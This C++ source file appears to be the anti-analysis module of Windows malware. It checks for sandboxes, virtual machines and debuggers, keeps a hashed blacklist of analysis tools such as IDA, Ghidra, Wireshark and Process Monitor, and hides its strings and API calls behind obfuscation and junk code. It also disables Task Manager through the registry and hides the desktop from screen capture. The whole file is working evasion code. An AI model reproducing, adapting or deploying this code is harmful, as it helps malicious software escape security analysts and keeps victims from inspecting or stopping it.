#include "AntiAnalysis.h"
#include "../utils/Config.h"
#include "../utils/DynamicAPI.h"
#include "../core/Obfuscation.h"
#include "../core/Internal.h"
#include "../core/Resolver.h"
#include <windows.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <vector>
#include <string>
#include "../../DebugLog.h"

#ifndef POLY_SEED
#define POLY_SEED 0
#endif
#define PROC_HASH_KEY ((DWORD)(POLY_SEED ^ 0xCAFEB0BA))
#define PHASH(str) (Resolver::HashString(str) ^ PROC_HASH_KEY)

static const DWORD g_processHashes[] = {
    PHASH("cheatengine"), PHASH("x32dbg"),    PHASH("x64dbg"),
    PHASH("ollydbg"),     PHASH("windbg"),    PHASH("ida"),
    PHASH("ida64"),       PHASH("ghidra"),    PHASH("radare2"),
    PHASH("immunitydbg"), PHASH("dnspy"),     PHASH("softice"),
    PHASH("wireshark"),   PHASH("procmon"),   PHASH("processhacker"),
    PHASH("procexp"),     PHASH("debugger"),  PHASH("vboxservice"),
    PHASH("vboxtray"),    PHASH("vmtoolsd"),  PHASH("vmwaretray"),
    PHASH("vmwareuser"),  PHASH("vgauthservice"), PHASH("vmacthlp"),
    PHASH("prl_tools"),   PHASH("prl_cc"),    PHASH("vmsrvc"),
    PHASH("vmusrvc"),     PHASH("df5serv"),   PHASH("pestudio"),
    PHASH("exeinfope"),   PHASH("lordpe"),    PHASH("peid"),
    PHASH("cff explorer"),PHASH("hiew"),      PHASH("reshacker"),
    PHASH("api monitor"), PHASH("regshot"),   PHASH("fakenet"),
    PHASH("httpdebugger"),PHASH("fiddler"),   PHASH("charles"),
    PHASH("glasswire"),   PHASH("tcpview"),
};
static const int g_processHashCount = sizeof(g_processHashes) / sizeof(g_processHashes[0]);

// Inline tolower — no CRT locale dependency
static __forceinline char InlineLower(char c) {
    return (c >= 'A' && c <= 'Z') ? (c + 32) : c;
}

namespace Modules {
    static bool CheckHardware() {
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
        if (DynAPI::GlobalMemStatusEx(&memInfo)) {
            if (memInfo.ullTotalPhys / (1024ULL * 1024 * 1024) < 3) return true;
        }
        SYSTEM_INFO si;
        DynAPI::GetSysInfo(&si);
        if (si.dwNumberOfProcessors <= 2) return true;
        return false;
    }

    static bool CheckUptime() {
        ULONGLONG uptime = DynAPI::GetTickCount() / 1000;
        return (uptime < 120);
    }

    static bool CheckCPUIDHypervisor() {
        int cpuInfo[4] = {};
        __cpuid(cpuInfo, 1);
        return (cpuInfo[2] >> 31) & 1;
    }

    static bool CheckRegistryVM() {
        // All VM registry keys are encrypted — no plaintext in binary
        HKEY hKey;

        OBFS_W_DECL(k1, L"SOFTWARE\\VMware, Inc.\\VMware Tools");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE, k1, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DynAPI::RegClose(hKey); OBFS_W_WIPE(k1); return true;
        }
        OBFS_W_WIPE(k1);

        OBFS_W_DECL(k2, L"SOFTWARE\\Oracle\\VirtualBox Guest Additions");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE, k2, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DynAPI::RegClose(hKey); OBFS_W_WIPE(k2); return true;
        }
        OBFS_W_WIPE(k2);

        OBFS_W_DECL(k3, L"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE, k3, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DynAPI::RegClose(hKey); OBFS_W_WIPE(k3); return true;
        }
        OBFS_W_WIPE(k3);

        OBFS_W_DECL(k4, L"SYSTEM\\CurrentControlSet\\Services\\vmci");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE, k4, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DynAPI::RegClose(hKey); OBFS_W_WIPE(k4); return true;
        }
        OBFS_W_WIPE(k4);

        OBFS_W_DECL(k5, L"SYSTEM\\CurrentControlSet\\Services\\VMwareMouseSyncer");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE, k5, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DynAPI::RegClose(hKey); OBFS_W_WIPE(k5); return true;
        }
        OBFS_W_WIPE(k5);

        OBFS_W_DECL(k6, L"HARDWARE\\ACPI\\DSDT\\VBOX__");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE, k6, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DynAPI::RegClose(hKey); OBFS_W_WIPE(k6); return true;
        }
        OBFS_W_WIPE(k6);

        OBFS_W_DECL(k7, L"HARDWARE\\ACPI\\FADT\\VBOX__");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE, k7, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DynAPI::RegClose(hKey); OBFS_W_WIPE(k7); return true;
        }
        OBFS_W_WIPE(k7);

        OBFS_W_DECL(k8, L"HARDWARE\\ACPI\\RSDT\\VBOX__");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE, k8, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DynAPI::RegClose(hKey); OBFS_W_WIPE(k8); return true;
        }
        OBFS_W_WIPE(k8);

        return false;
    }

    // Timing check — uses __rdtsc() intrinsic instead of QueryPerformanceCounter IAT import
    static bool CheckTiming() {
        unsigned __int64 t1 = __rdtsc();
        volatile int x = 0;
        for (int i = 0; i < 1000000; i++) x += i;
        unsigned __int64 t2 = __rdtsc();
        // ~1M iterations on modern CPU ≈ 2-5ms (< 50M cycles)
        // Under single-stepping debugger: >> 500M cycles
        unsigned __int64 diff = t2 - t1;
        return (diff > 500000000ULL);
    }

    // Wine check — resolved APIs, encrypted strings
    static bool CheckWine() {
        auto ntdllStr = OBFS_S("ntdll.dll");
        HMODULE hNtdll = Internal::_GetModuleHandleA(ntdllStr.c_str());
        if (!hNtdll) return false;
        auto wineFunc = OBFS_S("wine_get_version");
        return (Internal::_GetProcAddress(hNtdll, wineFunc.c_str()) != nullptr);
    }

    // Sandbox DLL check — all names encrypted, resolved API
    static bool CheckSandboxDLLs() {
        if (Internal::_GetModuleHandleA(OBFS_S("SbieDll.dll").c_str()))  return true;
        if (Internal::_GetModuleHandleA(OBFS_S("VBoxHook.dll").c_str())) return true;
        if (Internal::_GetModuleHandleA(OBFS_S("VBoxSF.dll").c_str()))   return true;
        if (Internal::_GetModuleHandleA(OBFS_S("VBoxDisp.dll").c_str())) return true;
        if (Internal::_GetModuleHandleA(OBFS_S("vmcheck.dll").c_str()))  return true;
        if (Internal::_GetModuleHandleA(OBFS_S("wpespy.dll").c_str()))   return true;
        if (Internal::_GetModuleHandleA(OBFS_S("snxhk.dll").c_str()))    return true;
        if (Internal::_GetModuleHandleA(OBFS_S("pstorec.dll").c_str()))  return true;
        if (Internal::_GetModuleHandleA(OBFS_S("avghookx.dll").c_str())) return true;
        if (Internal::_GetModuleHandleA(OBFS_S("avghooka.dll").c_str())) return true;
        if (Internal::_GetModuleHandleA(OBFS_S("guard64.dll").c_str()))  return true;
        if (Internal::_GetModuleHandleA(OBFS_S("sft.dll").c_str()))      return true;
        if (Internal::_GetModuleHandleA(OBFS_S("sbiedll.dll").c_str()))  return true;
        return false;
    }

    // Disk size check — resolved API, encrypted path
    static bool CheckDiskSize() {
        ULARGE_INTEGER total = {};
        auto drive = OBFS_S("C:\\");
        if (Internal::_GetDiskFreeSpaceExA)
            Internal::_GetDiskFreeSpaceExA(drive.c_str(), nullptr, &total, nullptr);
        return (total.QuadPart < 60ULL * 1024 * 1024 * 1024);
    }

    bool AntiAnalysis::IsSandbox() {
        JUNK_CODE_SMALL
        if (CheckHardware()) {
            SLOG("[!] Sandbox detected: Low hardware resources.");
            return true;
        }
        if (CheckUptime()) {
            SLOG("[!] Sandbox detected: System uptime too low.");
            return true;
        }
        if (CheckCPUIDHypervisor()) {
            SLOG("[!] Sandbox detected: Hypervisor bit set (CPUID).");
            return true;
        }
        if (CheckRegistryVM()) {
            SLOG("[!] Sandbox detected: VM registry keys found.");
            return true;
        }
        if (CheckSandboxDLLs()) {
            SLOG("[!] Sandbox detected: Sandbox-specific DLLs found in process.");
            return true;
        }
        if (CheckWine()) {
            SLOG("[!] Sandbox detected: Wine environment discovered.");
            return true;
        }
        if (CheckDiskSize()) {
            SLOG("[!] Sandbox detected: Disk size too small.");
            return true;
        }
        return false;
    }

    bool AntiAnalysis::IsDebugger() {
        JUNK_CODE_SMALL

        // ── Check 1: NtQueryInformationProcess (ProcessDebugPort = 7)
        // Replaces IsDebuggerPresent() — no IAT entry, uses existing syscall wrapper
        {
            DWORD_PTR port = 0;
            NTSTATUS st = Internal::NtQueryInformationProcess(
                (HANDLE)-1,  // NtCurrentProcess
                7,           // ProcessDebugPort
                &port, sizeof(port), nullptr);
            if (st == 0 && port != 0) {
                SLOG("[!] Debugger detected: ProcessDebugPort is non-zero.");
                return true;
            }
        }

        // ── Check 2: ProcessDebugObjectHandle (class 30) — catches kernel debuggers
        {
            HANDLE debugObj = NULL;
            NTSTATUS st = Internal::NtQueryInformationProcess(
                (HANDLE)-1, 30, &debugObj, sizeof(debugObj), nullptr);
            if (st == 0 && debugObj != NULL) {
                SLOG("[!] Debugger detected: ProcessDebugObjectHandle present.");
                return true;
            }
        }

        // ── Check 3: Timing anomaly via RDTSC (no IAT import)
        if (CheckTiming()) {
            SLOG("[!] Debugger detected: Timing anomaly (single-stepping).");
            return true;
        }

        // ── Check 4: Process blacklist via hash comparison
        // No plaintext tool names in binary — only compile-time DJB2 hashes
        if (DynAPI::CreateSnapshot && DynAPI::Proc32First && DynAPI::Proc32Next) {
            HANDLE hSnap = DynAPI::CreateSnapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe;
                pe.dwSize = sizeof(pe);
                if (DynAPI::Proc32First(hSnap, &pe)) {
                    do {
                        // Lowercase the process name inline (no CRT tolower)
                        char name[MAX_PATH];
                        int ni = 0;
                        for (const char* c = pe.szExeFile; *c && ni < MAX_PATH - 1; c++, ni++)
                            name[ni] = InlineLower(*c);
                        name[ni] = 0;

                        // Strip .exe suffix for matching
                        if (ni > 4 && name[ni-4] == '.' && name[ni-3] == 'e' &&
                            name[ni-2] == 'x' && name[ni-1] == 'e') {
                            name[ni-4] = 0;
                        }

                        // Hash the process name and compare against blacklist
                        DWORD nameHash = Resolver::HashString(name) ^ PROC_HASH_KEY;
                        for (int i = 0; i < g_processHashCount; i++) {
                            if (nameHash == g_processHashes[i]) {
                                SLOG("[!] Debugger detected: Blacklisted process (hash match).");
                                if (Internal::_CloseHandle) Internal::_CloseHandle(hSnap);
                                else DynAPI::CloseH(hSnap);
                                return true;
                            }
                        }
                    } while (DynAPI::Proc32Next(hSnap, &pe));
                }
                if (Internal::_CloseHandle) Internal::_CloseHandle(hSnap);
                else DynAPI::CloseH(hSnap);
            }
        }

        return false;
    }

    bool AntiAnalysis::SetMutex() {
        JUNK_CODE_SMALL
        // Dynamic mutex name from MachineGuid — no identifiable prefix
        char guid[64] = {};
        HKEY hKey;
        OBFS_W_DECL(cryptKey, L"SOFTWARE\\Microsoft\\Cryptography");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE,
            cryptKey, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
            DWORD sz = sizeof(guid) - 1;
            OBFS_W_DECL(guidVal, L"MachineGuid");
            DynAPI::RegQueryValueEx(hKey, guidVal, NULL, NULL, (LPBYTE)guid, &sz);
            OBFS_W_WIPE(guidVal);
            DynAPI::RegClose(hKey);
        }
        OBFS_W_WIPE(cryptKey);

        // If guid is empty, generate from RDTSC
        if (guid[0] == 0) {
            unsigned __int64 tsc = __rdtsc();
            Internal::IntToStr((int)(tsc & 0x7FFFFFFF), guid, sizeof(guid));
        }

        HANDLE hMutex = Internal::_CreateMutexA(nullptr, TRUE, guid);
        if (Internal::_GetLastError() == ERROR_ALREADY_EXISTS) {
            if (hMutex) {
                if (Internal::_CloseHandle) Internal::_CloseHandle(hMutex);
            }
            return false;
        }
        return true;
    }

    void AntiAnalysis::BlockTaskManager(bool block) {
        JUNK_CODE_SMALL
        HKEY hKey;
        OBFS_W_DECL(keyPath, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        OBFS_W_DECL(valName, L"DisableTaskMgr");
        DWORD val = block ? 1 : 0;
        if (DynAPI::RegCreateKeyEx(HKEY_CURRENT_USER, keyPath, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            DynAPI::RegSetValueEx(hKey, valName, 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
            DynAPI::RegClose(hKey);
        }
        OBFS_W_WIPE(keyPath);
        OBFS_W_WIPE(valName);
    }

    void AntiAnalysis::HideFromScreenCapture() {
        JUNK_CODE_SMALL
        if (DynAPI::SetWndDisplayAffinity && DynAPI::GetDesktopWnd) {
            HWND hWnd = DynAPI::GetDesktopWnd();
            if (hWnd) DynAPI::SetWndDisplayAffinity(hWnd, 0x00000011  );
        }
    }
}
